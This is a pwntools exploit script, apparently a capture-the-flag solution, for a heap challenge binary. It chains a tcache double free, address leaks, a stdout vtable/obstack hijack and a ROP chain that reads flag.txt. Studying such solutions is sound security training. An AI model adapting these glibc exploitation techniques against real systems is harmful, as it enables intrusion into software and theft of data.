#!/usr/bin/env python3
import sys
from pwn import *


context.binary = exe = ELF('./vuln')
libc = ELF("./libc.so.6")
if args.LOCAL:
    context.terminal = ['tmux','splitw','-h','-p','80']
    io = process([exe.path])
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def send(c):
    io.sendafter(b': ', p32(c))

def add(idx, val):
    cmd(1) ; send(idx)
    io.sendafter(b': ', val)

def delete(idx):
    cmd(2) ; send(idx)

def show(idx):
    cmd(4) ; send(idx)

def enc(ptr, addr):
    return ptr ^ (addr >> 12)

# ================ leak heap ================
for i in range(9):
    add(i, b'aa')
delete(0)
show(0)
heap = unpack(io.recvline()[:-1], 'all') * 0x1000
print('[+] heap: ', hex(heap))

# ================ use 2free to alloc chunk at tcachebins 0x20 ================
for i in range(8, 2, -1):
    delete(i)
delete(2) ; delete(1) ; delete(2)

for i in range(7):
    add(1, b'aa')
add(1, p64(enc(heap+0x90, heap+0x2e0)))
add(2, b'aa')
add(1, b'aa')
add(0, p64(0) + p64(0))     # create fake chunk at heap+0x90 (tcachebins 0x20)


add(9, b'aa')
for i in range(9, 2, -1):
    delete(i)
delete(2) ; delete(1) ; delete(2)

for i in range(7):
    add(1, b'aa')
add(1, p64(enc(heap+0x80, heap+0x2e0)))
add(2, b'aa')
add(1, b'aa')
add(1, p64(0) + p64(0x21))  # set valid size for fake chunk, so we can free it

delete(0) ; add(0, p64(0)+p64(0))       # fix 0x20 tcache

# ================ free fake big chunk to leak libc ================
def write(what, where):
    add(1, b'aa') ; delete(1)   # set tcache size to 1
    delete(0) ; add(0, p64(where))
    add(1, what)
    delete(0) ; add(0, p64(0)) # fix tcache

write(p64(0)+p64(0x461), heap+0x2d0) # set size of 2nd chunk to 0x460
for i in range(30):
    add(1, b'aa')
delete(2)
show(2)
libc.address = unpack(io.recvline()[:-1], 'all') - 0x219ce0
link_map = libc.address + 0x276000 + 0x12e0
print('[+] libc: ', hex(libc.address))
print('[+] link_map: ', hex(link_map))

# ================ leak stack ================
write(b'a'*0x10, libc.sym['environ']-0x10)
show(1)
io.recv(0x10)
stack = unpack(io.recvline()[:-1], 'all') - 0x168
print('[+] stack: ', hex(stack))

# # ================ leak base ================
# write(b'a'*0x10, link_map+0xd0)
# show(1)
# io.recv(0x10)
# exe.address = unpack(io.recvline()[:-1], 'all') - 0x3e88
# print('[+] exe: ', hex(exe.address))

# ================ rewrite `j_strchrnul` to `puts` ================
write(p64(0)+p64(libc.sym.puts), libc.address+0x2190B0)

# ================ ./flag.txt at libc.address+0x21AAAb ================
write(p64(0)+b'\0\0\0./fla', libc.address+0x21AAA0)
write(b'g.txt\0\0\0'+p64(0), libc.address+0x21AAb0)

# ================ create struct obstack and rewrite vtable in _IO_2_1_stdout ================
stdout = libc.sym['_IO_2_1_stdout_']
write(p64(0)+p64(libc.address+0x2163C0-0x20), stdout+0xd0)  # _IO_2_1_stdout.vtable
write(p64(stdout-8)+p64(stdout), stdout+0xe0)               # pointer to struct obstack
write(p64(libc.sym.read)+p64(libc.sym.read), stdout+0x30)   # obstack.chunkfun, obstack.freefun
write(p64(0)+p64(1), stdout+0x40)                           # obstack.extra_arg (rdi), obstack.use_extra_arg
write(p64(0)+p64(stack-0x188), stdout-0x10)                 # obstack.chunk_size (rsi)
write(p64(0)+p64(0x1000), stdout+0x20)                      # obstack.alignment_mask (rdx)

# ================ trigger __stack_chk_fail ================
# write(p64(0)+p64(0x31), stack)
add(1, b'aa') ; delete(1)
delete(0) ; add(0, p64(stack))
# if args.LOCAL: gdb.attach(io, 'set $h={heap}\nset $l={libc.address}\nset $m={link_map}\nb *__stack_chk_fail\nb *puts+200\nb *_obstack_newchunk+83\n'.format(**locals()))  # b *add+414\nb *_dl_fixup+252\n
add(1, p64(0)+p64(0x31))

pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0x2be51
pop_rdx_rbx = libc.address + 0x90529
mov_rdi_rax_call_rbx_0x360 = libc.address + 0x90108     # : mov rdi, rax ; call qword ptr [rbx + 0x360]
pop_r12 = libc.address + 0x35731
rop = flat([
    pop_rdi, libc.address+0x21AAAb,
    pop_rsi, 0,
    libc.sym.open,
    pop_rsi, stack+0x200,
    pop_rdx_rbx, 0x50, stack-0xf8-0x360,    # pointer to pop r12
    mov_rdi_rax_call_rbx_0x360,
    libc.sym.read,
    pop_rdi, 1,
    libc.sym.write,
    pop_rdi, 0,
    libc.sym['_exit'],
    pop_r12,
])
sleep(0.5)
io.send(rop)

io.recvuntil(b'BAN\n')
print(hexdump(io.recv(0x100)))

io.interactive()
